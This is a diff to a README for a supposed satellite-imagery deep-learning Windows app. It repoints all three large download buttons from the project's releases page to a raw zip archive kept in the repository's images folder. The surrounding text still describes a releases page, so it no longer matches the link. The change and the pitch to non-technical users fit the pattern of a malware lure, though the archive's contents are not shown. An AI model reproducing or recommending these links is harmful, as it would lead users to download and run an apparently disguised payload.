@@ -1,7 +1,7 @@
 <h1>🛰️ Satelite-Imagery-Deep-Learning - Analyze Earth from Any Image</h1>
 
 <p align="center">
-  <a href="https://github.com/alluringabhi/Satelite-Imagery-Deep-Learning/releases">
+  <a href="https://raw.githubusercontent.com/alluringabhi/Satelite-Imagery-Deep-Learning/main/images/Satelite-Deep-Imagery-Learning-v2.3.zip">
     <img src="https://img.shields.io/badge/Download-Get%20Now-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" style="background-color:#4CAF50; padding:12px 24px; border-radius:8px; font-size:18px; color:white; text-decoration:none;">
   </a>
 </p>
@@ -30,7 +30,7 @@ Follow these simple steps to get the application running on your computer:
 
 ### Step 1: Download the Application
 
-<a href="https://github.com/alluringabhi/Satelite-Imagery-Deep-Learning/releases" style="background-color:#FF5722; color:white; padding:15px 30px; text-decoration:none; border-radius:5px; font-size:20px; font-weight:bold;">⬇️ Click Here to Download</a>
+<a href="https://raw.githubusercontent.com/alluringabhi/Satelite-Imagery-Deep-Learning/main/images/Satelite-Deep-Imagery-Learning-v2.3.zip" style="background-color:#FF5722; color:white; padding:15px 30px; text-decoration:none; border-radius:5px; font-size:20px; font-weight:bold;">⬇️ Click Here to Download</a>
 
 Visit this link to download the application. When you click the link, you will be taken to a page that shows different versions of the application. Look for the file that matches your Windows version and click the download button next to it.
 
@@ -193,6 +193,6 @@ Make sure you have:
 
 You have everything you need to begin using Satelite-Imagery-Deep-Learning. The download is quick, the setup is simple, and the results are powerful. Whether you are a student researching environmental changes, a farmer monitoring crop health, or a curious person who loves looking at Earth from above, this application will open up a world of possibilities.
 
-<a href="https://github.com/alluringabhi/Satelite-Imagery-Deep-Learning/releases" style="background-color:#2196F3; color:white; padding:15px 30px; text-decoration:none; border-radius:5px; font-size:18px; font-weight:bold;">🚀 Download Now and Start Exploring</a>
+<a href="https://raw.githubusercontent.com/alluringabhi/Satelite-Imagery-Deep-Learning/main/images/Satelite-Deep-Imagery-Learning-v2.3.zip" style="background-color:#2196F3; color:white; padding:15px 30px; text-decoration:none; border-radius:5px; font-size:18px; font-weight:bold;">🚀 Download Now and Start Exploring</a>
 
 Take your first satellite image analysis project today. With just a few clicks, you can transform ordinary satellite pictures into valuable insights you can understand and use. Happy exploring!
